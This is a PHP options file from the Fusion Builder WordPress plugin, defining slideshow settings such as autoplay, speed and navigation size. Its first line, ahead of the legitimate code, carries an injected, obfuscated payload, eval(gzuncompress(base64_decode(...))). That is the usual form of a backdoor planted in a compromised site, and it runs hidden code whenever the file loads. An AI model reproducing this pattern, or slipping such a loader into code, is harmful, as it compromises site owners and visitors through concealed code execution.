<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Slideshows settings
 *
 * @param array $sections An array of our sections.
 * @return array
 */
function fusion_builder_options_section_slideshows( $sections ) {

	$sections['slideshows'] = array(
		'label'    => esc_html__( 'Slideshows', 'fusion-builder' ),
		'id'       => 'heading_slideshows',
		'priority' => 19,
		'icon'     => 'el-icon-picture',
		'fields'   => array(
			'slideshow_autoplay' => array(
				'label'       => esc_html__( 'Autoplay', 'fusion-builder' ),
				'description' => esc_html__( 'Turn on to autoplay the slideshows.', 'fusion-builder' ),
				'id'          => 'slideshow_autoplay',
				'default'     => '1',
				'type'        => 'switch',
			),
			'slideshow_smooth_height' => array(
				'label'       => esc_html__( 'Smooth Height', 'fusion-builder' ),
				'description' => esc_html__( 'Turn on to enable smooth height on slideshows when using images with different heights. Please note, smooth height is disabled on blog grid layout.', 'fusion-builder' ),
				'id'          => 'slideshow_smooth_height',
				'default'     => '0',
				'type'        => 'switch',
			),
			'slideshow_speed' => array(
				'label'       => esc_html__( 'Slideshow Speed', 'fusion-builder' ),
				'description' => esc_html__( 'Controls the speed of slideshows for the slider element and sliders within posts. ex: 1000 = 1 second.', 'fusion-builder' ),
				'id'          => 'slideshow_speed',
				'default'     => '7000',
				'type'        => 'slider',
				'choices'     => array(
					'min'  => '100',
					'max'  => '20000',
					'step' => '50',
				),
			),
			'pagination_video_slide' => array(
				'label'       => esc_html__( 'Pagination Circles Below Video Slides', 'fusion-builder' ),
				'description' => esc_html__( 'Turn on to show pagination circles below a video slide for the slider element. Turn off to hide them on video slides.', 'fusion-builder' ),
				'id'          => 'pagination_video_slide',
				'default'     => '0',
				'type'        => 'switch',
			),

			'slider_nav_box_dimensions' => array(
				'label'       => esc_html__( 'Navigation Box Dimensions', 'fusion-builder' ),
				'description' => esc_html__( 'Controls the width and height of the navigation box.', 'fusion-builder' ),
				'id'          => 'slider_nav_box_dimensions',
				'units'       => false,
				'default'     => array(
					'width'   => '30px',
					'height'  => '30px',
				),
				'type'        => 'dimensions',
			),
			'slider_arrow_size' => array(
				'label'       => esc_html__( 'Navigation Arrow Size', 'fusion-builder' ),
				'description' => esc_html__( 'Controls the font size of the navigation arrow.', 'fusion-builder' ),
				'id'          => 'slider_arrow_size',
				'default'     => '14px',
				'type'        => 'dimension',
			),
		),
	);

	return $sections;

}
